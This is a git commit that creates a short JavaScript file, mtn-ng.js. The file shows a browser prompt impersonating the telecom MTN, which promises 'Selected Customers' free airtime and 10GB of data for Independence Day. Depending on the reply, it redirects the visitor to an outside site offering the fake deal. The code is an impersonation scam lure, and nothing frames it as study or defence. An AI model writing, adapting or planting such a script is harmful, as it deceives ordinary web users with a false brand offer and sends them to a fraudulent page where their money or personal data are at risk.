bf3b9a9dd7161d2cd32ce1d1b968e5422b70ee14
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-09-30 02:25:24 -0700

    Create mtn-ng.js

---
+++ mtn-ng.js
@@ -0,0 +1,6 @@
+
+var password = '10GB + ₦2,500 Airtime  '
+password=prompt('MTN: Hello, you are among the MTN Selected Customers to receive ₦2,500 Airtime and 10GB Free Data Independence Day Offer. Press Ok to Activate now ','10GB + ₦2,500 Airtime ');
+if (password != '10GB + ₦2,500 Airtime ') {
+location.href='https://all-free-byt.org/10gb-independence.html';
+}
